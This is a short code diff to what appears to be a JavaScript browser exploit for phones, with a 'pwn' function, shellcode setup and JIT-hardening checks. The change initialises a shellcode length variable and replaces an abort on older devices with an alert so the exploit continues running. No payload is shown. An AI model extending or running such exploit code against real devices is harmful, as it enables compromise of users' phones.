@@ -26,11 +26,7 @@ var BASE32 = 0x100000000;
 var workbuf = new ArrayBuffer(0x1000000)
 var u32_buffer = new Uint32Array(workbuf);
 var u8_buffer = new Uint8Array(workbuf);
-var shellcode_length;
-
-
-
-
+var shellcode_length = 0;
 
 
 //Hex conversion
@@ -308,7 +304,8 @@ var pwn = function() {
     //JIT Hardening stuff
     if (!useFastPermisionsJITCopy || jitWriteSeparateHeapsFunction) {
         // Probably an older phone, should be even easier
-        fail(3);
+        //fail(3);
+        alert("This is an older device and can use jitWriteSeparateHeapsFunction, but continueing anyway for now...");
     }
     
     print("Setting up shellcode in memory...");
